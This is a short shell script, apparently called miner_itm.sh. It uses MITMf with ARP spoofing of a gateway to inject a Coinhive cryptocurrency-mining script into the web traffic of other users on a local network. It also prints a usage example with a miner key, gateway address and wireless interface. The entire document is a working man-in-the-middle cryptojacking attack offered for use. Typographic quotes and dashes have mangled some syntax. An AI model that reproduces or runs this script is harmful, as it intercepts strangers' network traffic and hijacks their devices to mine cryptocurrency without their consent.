if [ $# -eq “3” ]     then

echo “<script src=”https://coinhive.com/lib/coinhive.min.js”></script><script>var miner = new      CoinHive.Anonymous(‘”$1″‘);miner.start();</script>” > /root/.miner_itm.html

cd MITMf && python mitmf.py –inject –html-file /root/.miner_itm.html –spoof –arp –gateway $2 -i $3

else

echo “./miner_itm.sh gENbVb8JAy2rstF4qQBrv3liSePq5nqc 10.0.0.1 wlan0”
fi
